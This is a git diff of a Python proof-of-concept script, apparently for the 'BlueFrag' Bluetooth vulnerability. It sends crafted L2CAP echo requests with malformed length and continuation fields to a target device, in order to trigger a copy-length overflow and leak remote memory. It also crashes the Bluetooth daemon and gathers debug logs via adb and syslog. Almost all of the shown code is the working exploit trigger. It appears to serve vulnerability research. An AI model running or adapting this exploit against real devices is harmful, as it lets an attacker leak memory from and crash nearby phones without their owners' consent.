@@ -48,6 +48,7 @@ def recv_hci():
 
             #print "HCI", hexlify(pkt)
 
+#configure HCI socket
 os.system("hciconfig hci0 up")
 os.system("hciconfig hci0 sspmode 0")
 os.system("hcitool dc " + sys.argv[1])
@@ -57,19 +58,7 @@ hci.setsockopt(socket.SOL_HCI, socket.HCI_FILTER,'\xff\xff\xff\xff\xff\xff\xff\x
 hci.bind((0,))
 start_new_thread(recv_hci, ())
 
-'''
-while True:
-    try:
-        handle = 0
-        l2cap = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_L2CAP)
-        l2cap.connect((sys.argv[1], 0))
-        break
-    except socket.error:
-        print "Retry"
-        import traceback; traceback.print_exc()
-        l2cap.close()
-        time.sleep(1)
-'''
+#configure L2CAP socket
 connect_response = -1
 pid_l2cap = 0
 while connect_response != 0:
@@ -82,11 +71,24 @@ while connect_response != 0:
 
 start_new_thread(recv_l2cap, ())
 
+#wait for host to bind
 while handle == 0:
     pass
 
+"""
+	auxiliary function to form packet
+"""
 def pattern(n):
     return "".join([chr(i%255) for i in xrange(n)])
+
+"""
+	Discrpiption: form and send HCI ACL packet with L2CAP echo request.
+	Args: 
+		ident - packet identifier
+		x - data to sent
+		len_adj - length of continuation packet (can differ from real lenght. if adj_len less than 4, packet should trigger memory leak)
+		continuation_flags - specify if packet is continuation to another one. 0 - base, 1 - continuation.
+"""
 
 def send_echo_hci(ident, x, l2cap_len_adj=0, continuation_flags=0):
     l2cap_hdr = struct.pack("<BBH",0x8, ident, len(x) + l2cap_len_adj) #command identifier len
@@ -99,24 +101,33 @@ def send_echo_hci(ident, x, l2cap_len_adj=0, continuation_flags=0):
     hci.send("\x02" + hci_hdr + acl_hdr + l2cap_hdr + x)
 
 """
-collecting informatino for verbose analysis
+	Disctiption: collect information for verbose analysis.
+	Args:
+		debug_iter - iteration of debug files
 """
 def collect_debug_info(debug_iter):
-	output = subprocess.check_output("pgrep python", shell = True)
-	os.system("lsof -p " + str(output) + " > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-lsof-cur.txt")
-	os.system("sudo lsof -u root > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-lsof-all.txt")
-	os.system("sudo dmesg > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-dmesg.txt")
-	os.system("hciconfig -a > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-hciconfig.txt")
-	os.system("bluetoothctl show > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-bluetoothctl-show.txt")
-	os.system("bluetoothctl devices > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-bluetoothctl-devices.txt")
-	os.system("bluetoothctl info 80:1D:00:33:D8:82 > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-bluetoothctl-info.txt")
-	os.system("sudo cat /var/log/syslog > ~/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-syslog.txt")
+	#snapshot cur process
+	output = subprocess.check_output(["pgrep", "python"])
+	os.system("lsof -p " + str(output) + " > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-lsof-cur.txt")
+	#entire system snapshot
+	os.system("sudo lsof -u root > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-lsof-all.txt")
+	os.system("sudo dmesg > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-dmesg.txt")
+	os.system("sudo cat /var/log/syslog > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-syslog.txt")
+	#bluetooth adapter snapshot
+	os.system("hciconfig -a > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-hciconfig.txt")
+	os.system("bluetoothctl show > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-bluetoothctl-show.txt")
+	os.system("bluetoothctl devices > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-bluetoothctl-devices.txt")
+	os.system("bluetoothctl info 80:1D:00:33:D8:82 > /home/copied_wonder/BlueFrag_PoC/issue_2/" + str(debug_iter) + "-bluetoothctl-info.txt")
+
 	print "Debug info collected"
 
-def do_leak(ident=1):
+"""
+	Disctiption: Trigger copy_len overflow
+"""
+def do_leak(ident=42):
     global echo
     echo = False
-    send_echo_hci(0, "A"*(32))
+    send_echo_hci(41, "A"*(32))
     send_echo_hci(ident, "A"*70, l2cap_len_adj=2)
     send_echo_hci(ident+1, "B"*70, continuation_flags=1)
     #send analysis if requested
@@ -124,8 +135,11 @@ def do_leak(ident=1):
     	collect_debug_info(int(sys.argv[4]))
     while echo == False:
         pass
-    bluetooth_pid = subprocess.check_output("adb shell 'pgrep droid.bluetooth'", shell = True)
-    os.system("adb logcat --pid " + bluetooth_pid + " > ~/BlueFrag_PoC/issue_2/2-android-logcat.txt &")
+    #relaunch debug bridge after daemon crash
+    if len(sys.argv) > 4:
+    	time.sleep(1)
+        os.system("$bluetooth_pid=$(adb shell 'pgrep droid.bluetooth')")
+        os.system("adb logcat --pid=$bluetooth_pid > /home/copied_wonder/BlueFrag_PoC/issue_2/2-android-logcat.txt &")
     return echo
 
 print "Leaking remote handle"
